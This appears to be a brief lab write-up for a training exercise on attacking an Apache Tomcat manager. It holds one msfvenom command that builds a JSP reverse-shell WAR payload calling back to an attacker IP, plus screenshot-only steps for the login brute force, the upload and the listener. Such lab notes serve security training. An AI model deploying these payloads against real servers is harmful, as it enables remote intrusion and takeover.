# [Attacking Tomcat](Attacking%20Tomcat.md)
### Perform a login bruteforcing attack against Tomcat manager at http://web01.inlanefreight.local:8180. What is the valid username? What is the password?
![](Screenshot%202026-07-29%20at%2014.54.35.png)
### Obtain remote code execution on the http://web01.inlanefreight.local:8180 Tomcat instance. Find and submit the contents of tomcat_flag.txt

Create a `rshell`
```shell
msfvenom -p java/jsp_shell_reverse_tcp LHOST=10.10.14.69 LPORT=4443 -f war > backup.war
```

Then upload onto the web
![](Screenshot%202026-07-29%20at%2015.02.38.png)

Then open the listener
![](Screenshot%202026-07-29%20at%2015.01.21.png)
![](Screenshot%202026-07-29%20at%2015.06.14.png)
